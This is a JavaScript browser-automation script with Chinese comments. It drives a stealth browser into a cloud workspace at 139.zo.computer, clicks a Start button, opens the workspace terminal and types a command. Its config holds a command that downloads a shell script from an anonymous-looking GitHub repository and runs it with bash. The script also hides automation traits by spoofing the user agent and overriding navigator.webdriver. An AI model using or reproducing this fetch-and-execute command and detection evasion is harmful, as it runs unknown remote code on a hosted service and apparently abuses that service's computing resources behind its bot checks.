import { launch } from 'cloakbrowser';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  workspaceName: '139',
  waitAfterEnterWorkspace: 150000,
  headless: true,
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand: "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, path) {
  try { await page.screenshot({ path, fullPage: true }); } catch {}
}

async function selectWorkspace(page) {
  console.log('🔎 正在探测并进入工作区...');
  // 精确匹配：查找包含域名或名称的容器元素
  const selector = `text="${CONFIG.workspaceDomain}"`;
  const workspace = page.locator(selector).first();
  if (await workspace.isVisible({ timeout: 10000 })) {
    await workspace.click({ force: true });
    return true;
  }
  return false;
}

async function clickStartButton(page) {
  console.log('🚀 正在执行精准点击启动按钮策略...');
  
  // 核心改动：使用严格的属性选择器，排除掉 <p> 等文本标签
  // 优先匹配 button, role="button", 或特定 aria-label
  const btnSelector = 'button:has-text("Start"), button:has-text("Run"), button:has-text("开始"), [role="button"]:has-text("Start"), [aria-label*="Start"]';
  
  for (let i = 0; i < 15; i++) {
    const btn = page.locator(btnSelector).first();
    
    // 额外检查：确保该元素不是一个单纯的说明性段落
    if (await btn.isVisible({ timeout: 3000 })) {
      const tagName = await btn.evaluate(el => el.tagName);
      if (tagName === 'P' || tagName === 'DIV' && (await btn.innerText()).length > 50) {
        console.log(`⚠️ 忽略误匹配元素: <${tagName}>`);
      } else {
        await btn.scrollIntoViewIfNeeded();
        await btn.click({ force: true });
        console.log('✅ 精准点击成功');
        await page.waitForTimeout(10000);
        return true;
      }
    }
    await page.waitForTimeout(5000);
  }
  await safeScreenshot(page, 'debug-button-fail.png');
  return false;
}

async function run() {
  const url = process.argv[2];
  if (!url) process.exit(1);

  const browser = await launch({ headless: CONFIG.headless });
  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  });
  const page = await context.newPage();

  // 抹除自动化特征
  await page.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); });

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 90000 });
    
    // 1. 选择工作区
    await selectWorkspace(page);
    await page.waitForTimeout(CONFIG.waitAfterEnterWorkspace);
    
    // 2. 精准点击启动
    await clickStartButton(page);
    
    // 3. 终端操作
    if (CONFIG.runTmuxInit) {
      await page.mouse.click(200, 400);
      await page.keyboard.press('Control+Shift+`');
      await page.waitForTimeout(5000);
      await page.keyboard.insertText(CONFIG.tmuxCommand);
      await page.keyboard.press('Enter');
      await page.waitForTimeout(10000);
    }
    
    await safeScreenshot(page, 'result.png');
    console.log('✅ 执行流程结束');
  } catch (err) {
    console.error('❌ 执行失败:', err);
    await safeScreenshot(page, 'error-final.png');
  } finally {
    await browser.close();
  }
}

run();
